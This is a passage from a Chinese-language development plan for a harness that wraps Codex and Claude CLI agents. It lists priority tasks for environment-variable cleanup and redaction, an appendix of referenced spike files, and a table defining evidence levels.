5. **P1**: 实现环境变量清理（不传递宿主敏感变量到子进程）
6. **P1**: 实现诊断包二次脱敏和路径脱敏

---

## 附录 A: 引用

- `kruon_MVP开发计划_2026-07-11.md` — 架构、模块边界、M0 退出标准
- `spikes/cli-adapters/capability_manifest.py` — LaunchPlan 构建、DANGEROUS_FLAGS、fingerprint
- `spikes/cli-adapters/event_parser.py` — 事件解析、secret redaction、路径检查、终端状态分类
- `spikes/cli-adapters/normalized_event.schema.json` — 规范事件 schema
- `spikes/cli-adapters/probe.py` — 安全探针、双 key opt-in、fixture 自测
- `spikes/cli-adapters/README.md` — 已验证事实 vs 推断
- `spikes/cli-adapters/snapshots/codex_capability.json` — Codex 能力快照
- `spikes/cli-adapters/snapshots/claude_capability.json` — Claude 能力快照
- `spikes/cli-adapters/fixtures/manifest.json` — 10 组合成 fixture

## 附录 B: 证据等级定义

| 等级 | 含义 | 示例 |
|------|------|------|
| `verified` | 有代码实现、单元测试或帮助文本证据 | `_check_safe_args()` 拒绝 DANGEROUS_FLAGS |
| `inferred` | 架构设计有此能力，但未经过真实运行验证 | Claude permission_request 双向回传 |
| `unverified` | 已识别为需求，但尚未实现或测试 | macOS 子进程文件系统隔离 |
